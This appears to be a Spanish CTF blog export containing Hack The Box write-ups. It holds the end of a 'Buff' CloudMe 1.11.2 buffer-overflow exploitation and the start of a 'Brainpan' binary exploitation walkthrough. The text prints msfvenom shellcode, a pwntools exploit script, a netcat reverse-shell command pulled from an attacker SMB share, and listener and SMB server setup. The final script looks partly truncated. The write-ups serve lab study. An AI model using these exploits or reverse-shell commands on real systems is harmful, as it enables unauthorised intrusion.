b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; b\u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; b\u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; b\u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; b\u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; b\u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; b\u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) payload = before_eip + eip + badchars host, port = \u0026#34;127.0.0.1\u0026#34;, 8888 r = remote(host, port) r.sendline(payload) Desde immunity debbuger podemos comprobar 1 a 1 si el carácter se muestra o no\nEsto es un tostón, por eso antes hemos instalado mona.py, que como dije antes nos serviría para automatizar procesos\nEmpezamos con mona configurando el directorio de trabajo\n!mona config -set workingfolder C:\\Users\\arnau\\Desktop\\bof Seguimos creando una cadena de bytes para comprobar los badchars, pero excluimos el \\x00 (Null byte) porque siempre da problemas\n!mona bytearray -b \u0026#34;\\x00\u0026#34; Dentro de la carpeta que hemos configurado como \u0026ldquo;workingfolder\u0026rdquo; han aparecido dos archivos. Dentro del bytearray.txt tenemos la misma cadena de caracteres que hemos configurado antes, así que no nos va a hacer falta modificar el script. El archivo que vamos a usar es el bytearray.bin.\n!mona compare -f C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin -a 0022F930 Este comando lo que va a hacer es comprobar si los caracteres se muestran bien, o dan algún problema. Con el parámetro -a tenemos que especificar la dirección del ESP donde hemos puesto la cadena de bytes para comprobar los badchars. Después de ejecutarlo se abre la siguiente ventana, donde dice que no hay ningún badchar, lo que significa que todos se muestran y se procesan de forma exitosa.\nProtecciones Listamos todos los módulos para ver las protecciones que tienen\n!mona modules Tipos de protecciones\rNombre Descripción CANARY (Stack Canary) Es una técnica de seguridad que se utiliza para detectar desbordamientos de búfer. Un \u0026ldquo;canario\u0026rdquo; es un valor colocado antes de la información sensible en la memoria y si este valor cambia, indica que la memoria ha sido alterada, lo que sugiere un intento de ataque. CANARY (Stack Canary) Es una técnica de seguridad que se utiliza para detectar desbordamientos de búfer. Un \u0026ldquo;canario\u0026rdquo; es un valor colocado antes de la información sensible en la memoria y si este valor cambia, indica que la memoria ha sido alterada, lo que sugiere un intento de ataque. FORTIFY (Fortify Source) Es una característica de seguridad en compiladores y bibliotecas de C que ayuda a proteger contra vulnerabilidades de desbordamiento de búfer y otros problemas de seguridad. Esta característica agrega comprobaciones de seguridad automáticas al código durante la compilación. NX (No-eXecute) Es una tecnología de hardware y una característica de seguridad que ayuda a prevenir la ejecución de código en regiones de memoria designadas como datos. Esto es útil para prevenir ataques de inyección de código, como los ataques de desbordamiento de búfer. PIE (Position Independent Executable) Es una técnica de seguridad que compila un ejecutable de manera que su carga en memoria sea aleatoria, lo que dificulta la explotación de vulnerabilidades por parte de los atacantes al no poder predecir la ubicación exacta del código en la memoria. RELRO (RELocation Read-Only) Es una técnica de seguridad que marca ciertas secciones de la tabla de enlace dinámico (DT) como de solo lectura después de que el enlazador ha resuelto todas las direcciones. Esto ayuda a proteger contra ataques que intentan modificar la tabla de enlace dinámico para redirigir el flujo de control del programa. De todos los .dll que salen de CloudMe interesan los que tienen todas las protecciones en False.\nJMP ESP Entre todos los .dll que salen en false buscamos si tienen un JMP ESP (Una dirección que salte al ESP, que es donde vamos a poner el shellcode), es importante que tenga {PAGE_EXECUTE_READ}, para poder ejecutar nuestro shellcode\n!mona find -s \u0026#34;\\xFF\\xE4\u0026#34; -m Qt5Core.dll Después de una búsqueda entre los .dll al final el Qt5Core.dll cumple con las características\nYa tenemos la dirección para saltar al ESP: 0x68a98a6b\nShellCode Ahora toca crear el shellcode, que va a ejecutar lo siguiente \\\\192.168.1.135\\smb\\nc.exe -e cmd.exe 192.168.1.135 443 en la máquina víctima, y nos mandara una shell a nuestra máquina de atacante.\nmsfvenom -a x86 -p windows/exec CMD=\u0026#39;\\\\192.168.1.135\\smb\\nc.exe -e cmd.exe 192.168.1.135 443\u0026#39; -b \u0026#39;\\x00\u0026#39; -f python [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 267 (iteration=0) x86/shikata_ga_nai chosen with final size 267 Payload size: 267 bytes Final size of python file: 1332 bytes buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xdb\\xc8\\xd9\\x74\\x24\\xf4\\x5b\\xba\\x12\\xf3\\x19\\x43\u0026#34; buf += b\u0026#34;\\x29\\xc9\\xb1\\x3d\\x31\\x53\\x17\\x03\\x53\\x17\\x83\\xd1\u0026#34; buf += b\u0026#34;\\xf7\\xfb\\xb6\\x29\\x1f\\x79\\x38\\xd1\\xe0\\x1e\\xb0\\x34\u0026#34; buf += b\u0026#34;\\xd1\\x1e\\xa6\\x3d\\x42\\xaf\\xac\\x13\\x6f\\x44\\xe0\\x87\u0026#34; buf += b\u0026#34;\\xe4\\x28\\x2d\\xa8\\x4d\\x86\\x0b\\x87\\x4e\\xbb\\x68\\x86\u0026#34; buf += b\u0026#34;\\xcc\\xc6\\xbc\\x68\\xec\\x08\\xb1\\x69\\x29\\x74\\x38\\x3b\u0026#34; buf += b\u0026#34;\\xe2\\xf2\\xef\\xab\\x87\\x4f\\x2c\\x40\\xdb\\x5e\\x34\\xb5\u0026#34; buf += b\u0026#34;\\xac\\x61\\x15\\x68\\xa6\\x3b\\xb5\\x8b\\x6b\\x30\\xfc\\x93\u0026#34; buf += b\u0026#34;\\x68\\x7d\\xb6\\x28\\x5a\\x09\\x49\\xf8\\x92\\xf2\\xe6\\xc5\u0026#34; buf += b\u0026#34;\\x1a\\x01\\xf6\\x02\\x9c\\xfa\\x8d\\x7a\\xde\\x87\\x95\\xb9\u0026#34; buf += b\u0026#34;\\x9c\\x53\\x13\\x59\\x06\\x17\\x83\\x85\\xb6\\xf4\\x52\\x4e\u0026#34; buf += b\u0026#34;\\xb4\\xb1\\x11\\x08\\xd9\\x44\\xf5\\x23\\xe5\\xcd\\xf8\\xe3\u0026#34; buf += b\u0026#34;\\x6f\\x95\\xde\\x27\\x2b\\x4d\\x7e\\x7e\\x91\\x20\\x7f\\x60\u0026#34; buf += b\u0026#34;\\x7a\\x9c\\x25\\xeb\\x97\\xc9\\x57\\xb6\\xfd\\x0c\\xe5\\xcd\u0026#34; buf += b\u0026#34;\\xb0\\x0f\\xf5\\xcd\\xe4\\x67\\xc4\\x46\\x6b\\xff\\xd9\\x8d\u0026#34; buf += b\u0026#34;\\xcf\\x0f\\x90\\x8f\\x66\\x98\\x7d\\x5a\\x3b\\xc5\\x7d\\xb1\u0026#34; buf += b\u0026#34;\\x78\\xf0\\xfd\\x33\\x01\\x07\\x1d\\x36\\x04\\x43\\x99\\xab\u0026#34; buf += b\u0026#34;\\x74\\xdc\\x4c\\xcb\\x2b\\xdd\\x44\\x97\\x97\\x10\\x5e\\x15\u0026#34; buf += b\u0026#34;\\x06\\x62\\x96\\x61\\x78\\xb5\\xf8\\xa0\\xb7\\x80\\x58\\xb1\u0026#34; buf += b\u0026#34;\\xda\\x88\\x3c\\x5b\\x46\\x63\\xd8\\xdb\\xed\\x5b\\x0f\\x7e\u0026#34; buf += b\u0026#34;\\xce\\xf8\\x22\\xe4\\x20\\x9a\\xc4\\x81\\x1c\\x55\\x0c\\x7b\u0026#34; buf += b\u0026#34;\\x73\\xa4\\x58\\x43\\xa5\\xf7\\x8a\\x82\\x8a\\xc2\\xf2\\xd0\u0026#34; buf += b\u0026#34;\\xd8\\x1f\\xf3\u0026#34; Explicación parámetros\rParámetro Función -a x86 Especifica la arquitectura del objetivo, en este caso, x86. -p windows/exec Selecciona el payload a utilizar, en este caso, windows/exec, que nos sirve para ejecutar comandos en la máquina víctima CMD=\u0026rsquo;\\192.168.1.135\\smb\\nc.exe -e cmd.exe 192.168.1.135 443 Define el comando a ejecutar por el payload -b \u0026lsquo;\\x00 Especifica los badchars para que msfvenom no los ponga en el shellcode, ya que no se van a interpretar -f python Define el formato de salida del shell code, en este caso python para que podamos simplemente copiar el output y pegarlo en el script sin necesidad de adaptar nada Script final Para finalizar la explotación del buffer overflow creamos un script basándonos en toda la información que hemos ido recopilando a lo largo de la resolución\n\u0026lsquo;A\u0026rsquo; * 1052: Primero mandamos 1052 \u0026lsquo;A\u0026rsquo; para llegar al EIP 0x68a98a6b: Segimos con el valor del EIP, que le pondremos la dirección para saltar al ESP \u0026lsquo;ShellCode\u0026rsquo;: Lo último que mandamos es el shellcode. from pwn import * from struct import pack offset = 1052 before_eip = b\u0026#34;A\u0026#34; * offset eip = pack(\u0026#34;\u0026lt;I\u0026#34;, 0x68a98a6b) buf += b\u0026#34;\\xcc\\xc6\\xbc\\x68\\xec\\x08\\xb1\\x69\\x29\\x74\\x38\\x3b\u0026#34; buf += b\u0026#34;\\xe2\\xf2\\xef\\xab\\x87\\x4f\\x2c\\x40\\xdb\\x5e\\x34\\xb5\u0026#34; buf += b\u0026#34;\\xac\\x61\\x15\\x68\\xa6\\x3b\\xb5\\x8b\\x6b\\x30\\xfc\\x93\u0026#34; buf += b\u0026#34;\\x68\\x7d\\xb6\\x28\\x5a\\x09\\x49\\xf8\\x92\\xf2\\xe6\\xc5\u0026#34; buf += b\u0026#34;\\x1a\\x01\\xf6\\x02\\x9c\\xfa\\x8d\\x7a\\xde\\x87\\x95\\xb9\u0026#34; buf += b\u0026#34;\\x9c\\x53\\x13\\x59\\x06\\x17\\x83\\x85\\xb6\\xf4\\x52\\x4e\u0026#34; buf += b\u0026#34;\\xb4\\xb1\\x11\\x08\\xd9\\x44\\xf5\\x23\\xe5\\xcd\\xf8\\xe3\u0026#34; buf += b\u0026#34;\\x6f\\x95\\xde\\x27\\x2b\\x4d\\x7e\\x7e\\x91\\x20\\x7f\\x60\u0026#34; buf += b\u0026#34;\\x7a\\x9c\\x25\\xeb\\x97\\xc9\\x57\\xb6\\xfd\\x0c\\xe5\\xcd\u0026#34; buf += b\u0026#34;\\xb0\\x0f\\xf5\\xcd\\xe4\\x67\\xc4\\x46\\x6b\\xff\\xd9\\x8d\u0026#34; buf += b\u0026#34;\\xcf\\x0f\\x90\\x8f\\x66\\x98\\x7d\\x5a\\x3b\\xc5\\x7d\\xb1\u0026#34; buf += b\u0026#34;\\x78\\xf0\\xfd\\x33\\x01\\x07\\x1d\\x36\\x04\\x43\\x99\\xab\u0026#34; buf += b\u0026#34;\\x74\\xdc\\x4c\\xcb\\x2b\\xdd\\x44\\x97\\x97\\x10\\x5e\\x15\u0026#34; buf += b\u0026#34;\\x06\\x62\\x96\\x61\\x78\\xb5\\xf8\\xa0\\xb7\\x80\\x58\\xb1\u0026#34; buf += b\u0026#34;\\xda\\x88\\x3c\\x5b\\x46\\x63\\xd8\\xdb\\xed\\x5b\\x0f\\x7e\u0026#34; buf += b\u0026#34;\\xce\\xf8\\x22\\xe4\\x20\\x9a\\xc4\\x81\\x1c\\x55\\x0c\\x7b\u0026#34; buf += b\u0026#34;\\x73\\xa4\\x58\\x43\\xa5\\xf7\\x8a\\x82\\x8a\\xc2\\xf2\\xd0\u0026#34; buf += b\u0026#34;\\xd8\\x1f\\xf3\u0026#34; payload = before_eip + eip + b\u0026#34;\\x90\u0026#34;*16 + buf host, port = \u0026#34;127.0.0.1\u0026#34;, 8888 r = remote(host, port) r.sendline(payload) Antes de ejecutarlo hay que ponerse en escucha por el puerto 443\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha Y también hay que abrir un servidor con samba para compartir el nc.exe\nimpacket-smbserver smb $(pwd) -smb2support Explicación parámetros\rsmb: Nombre del recurso compartido $(pwd): Esto devuelve el directorio en el cual estamos, y imapcket-server comparte el contenido de la ruta especificada \u0026ndash;smb2support: Habilita el soporte para el protocolo SMB2 Ejecutamos el script y\u0026hellip; ¡Recibimos la conexión!\nAhora solo falta, envés de poner nuestra ip poner la de la máquina Buff y listo, máquina completada\n","date":"2024-03-18","id":45,"permalink":"/writeups/hackthebox/buff/","summary":"Es una máquina muy simple, pero vamos a analizar en profundidad un Buffer Overflow de CloudMe 1.11.2 y un \u0026lsquo;Unauthenticated Remote Code Execution\u0026rsquo; en  \u0026lsquo;Gym Management System 1.0\u0026rsquo;","tags":["CTF","BoF","File Upload","Portfordwarding"],"title":"Buff"},{"content":"","date":"2024-03-18","id":46,"permalink":"/tags/ctf/","summary":"","tags":[],"title":"CTF"},{"content":"","date":"2024-03-18","id":47,"permalink":"/tags/portfordwarding/","summary":"","tags":[],"title":"Portfordwarding"},{"content":"","date":"2024-02-11","id":48,"permalink":"/ctf/","summary":"","tags":[],"title":"Ctf"},{"content":"","date":"2024-02-10","id":49,"permalink":"/tags/binary-explotation/","summary":"","tags":[],"title":"Binary Explotation"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 192.168.1.139 PING 192.168.1.139 (192.168.1.139) 56(84) bytes of data. 64 bytes from 192.168.1.139: icmp_seq=1 ttl=64 time=0.240 ms --- 192.168.1.139 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.240/0.240/0.240/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 192.168.1.139 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 192.168.1.139 5 │ [*] Open ports: 9999,10000 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; sudo nmap -p9999,10000 -sCV 192.168.1.139 -oN versions Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 18:42 CET Nmap scan report for 192.168.1.139 Host is up (0.00053s latency). PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 |_http-title: Site doesn\u0026#39;t have a title (text/html). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.94SVN%I=7%D=2/4%Time=65BFCC92%P=x86_64-pc-linux-gnu%r( SF:NULL,298,\u0026#34;_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_ SF:\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x2 SF:0\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\| SF:\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\| SF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\| SF:\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_ SF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20 SF:\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20 SF:\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20 SF:\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x2 SF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20 SF:\\x20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN SF:\\x20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER SF:\\x20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026gt;\u0026gt;\\x20\u0026#34;); MAC Address: 08:00:27:C3:40:1B (Oracle VirtualBox virtual NIC) Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 10000 Nmap ha reportado que por el puerto 10000 hay un SimpleHTTPServer de versión 0.6 (Python 2.7.3). Esto también lo podríamos haber visto con whatweb\n$ whatweb 192.168.1.139:10000 http://192.168.1.139:10000 [200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.3], IP[192.168.1.139], Python[2.7.3] Al entrar a la web vemos una página simple sin nada destacable. En este punto podríamos tratar de hacer fuzzing para enumerar archivos o directorios dentro del servidor web. Para ello vamos a usar la herramienta wfuzz\n\u0026gt; wfuzz -c -t 20 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.139:10000/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000483: 301 0 L 0 W 0 Ch \u0026#34;bin\u0026#34; Explicación parámetros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo \u0026ndash;hc=404: Con esto le decimos que no nos interesan las respuestas cuyo código de estado sea 404, lo que significa que no queremos que nos reporte páginas que no existen -w: Diccionario FUZZ: Es donde va a ir probando el contenido del diccionario Ha encontrado un directorio llamado bin en el cual dentro hay un archivo llamado brainpan.exe, vamos a descargárnoslo\n$ wget 192.168.1.139:10000/bin/brainpan.exe 2024-02-04 18:57:28 (44.7 MB/s) - ‘brainpan.exe’ saved [21190/21190] Vamos a pasarnos este binario a una máquina windows 7, en mi caso de 32 bits, mediante un servidor de python creado desde la máquina atacante con python3 -m http.server 80. Ahora desde el navegador de windows 7 si ponemos nuestra ip ya nos podremos bajar el archivo.\nPuerto 9999 Al ejecutar el brainpan.exe desde la máquina windows, se abre una terminal en la cual pone \u0026ldquo;bind done on port 9999 waitin for connextions\u0026rdquo; Casualmente es el mismo puerto que tenía abierto la máquina víctima.\nSi probamos de conectarnos con netcat por el puerto 9999 a la máquina windows y después nos conectamos a la máquina víctima por el puerto 9999 vemos que el mensaje es el mismo.\n\u0026gt; nc 192.168.1.141 9999 #Windows 7 _| _| _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| _| _| [________________________ WELCOME TO BRAINPAN _________________________] ENTER THE PASSWORD \u0026gt;\u0026gt; \u0026gt; nc 192.168.1.139 9999 #Víctima _| _| _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| _| _| [________________________ WELCOME TO BRAINPAN _________________________] ENTER THE PASSWORD \u0026gt;\u0026gt; Con esto sacamos la conclusión de que el archivo brainpan.exe es el mismo que se está ejecutando en la máquina víctima\nBuffer Overflow Para analizar el binario usaremos Inmunnity Debugger con mona.\nPrimero importamos el archivo en Imunity Debugger. Una vez importado lo ejecutamos desde inmunity debugger.\nDurante la explotación vamos a ir desarrollando un script en python para agilizarlo todo\u0026hellip;\nfrom pwn import * offset = 1000 junk = b\u0026#34;A\u0026#34; * offset payload = junk host, port = \u0026#34;192.168.1.141\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Lo que vamos a hacer con esto es mandarle 1000 \u0026ldquo;A\u0026rdquo; al programa que corre por el puerto 9999 de la máquina windows.\nUna vez ejecutado el script. Desde inmunity debugger se puede ver como ahora el EIP vale 41414141 lo que equivale a AAAA Esto significa que si ponemos un input muy largo podemos llegar a sobreescribir el EIP\nEIP: (Punto de Instrucción de Entrada) es un registro que almacena la dirección de la próxima instrucción a ejecutar en un programa.\nCalcular Offset Ahora buscaremos cuantas \u0026ldquo;A\u0026rdquo; hay que poner para llegar al EIP. Para encontrar este número llamado offset, usaremos una cadena de caracteres diseñada para esto.\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5... Este comando nos ha generado una cadena de 1800 caracteres. La cual vamos a añadir en el script.\nfrom pwn import * junk = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8\u0026gt; payload = junk host, port = \u0026#34;192.168.1.141\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Ejecutamos el script, y en el Imunnity Debugger aparece que el EIP vale: 35724134.\nCon el siguiente comando calculamos automáticamente el offset\n$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1800 -q 35724134 [*] Exact match at offset 524 Buscar badchars Una vez tenemos el control del EIP vamos a comprobar si hay badchars.\nLos badchars básicamente son caracteres que pueden dar problemas a la hora de ejecutar un shellcode, un badchar típico es el \\x00 (Null byte) el cual ya se suele excluir directamente porque da muchos problemas.\nPara comprobar los badchars podríamos hacerlo de forma manual, pero vamos a usar mona para automatizarlo. Primero hay que definir el directorio de trabajo, en mi caso va a ser C:\\Users\\arnau\\Desktop\\bof\n!mona config -set workingfolder C:\\Users\\arnau\\Desktop\\bof Después vamos a crear un archivo con todos los bytes excluyendo el null byte (\\x00), y lo vamos a guardar en el directorio de trabajo.\n!mona bytearray -b \u0026#34;\\x00\u0026#34; Ahora dentro del archivo C:\\Users\\arnau\\Desktop\\bof\\bytearray.txt están todos los bytes.\n================================================================================ Output generated by mona.py v2.0, rev 635 - Immunity Debugger Corelan Consulting bv - https://www.corelan.be ================================================================================ OS : 7, release 6.1.7601 Process being debugged : brainpan (pid 2272) Current mona arguments: bytearray -b \u0026#34;\\x00\u0026#34; ================================================================================ 2024-02-05 19:12:33 ================================================================================ \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; 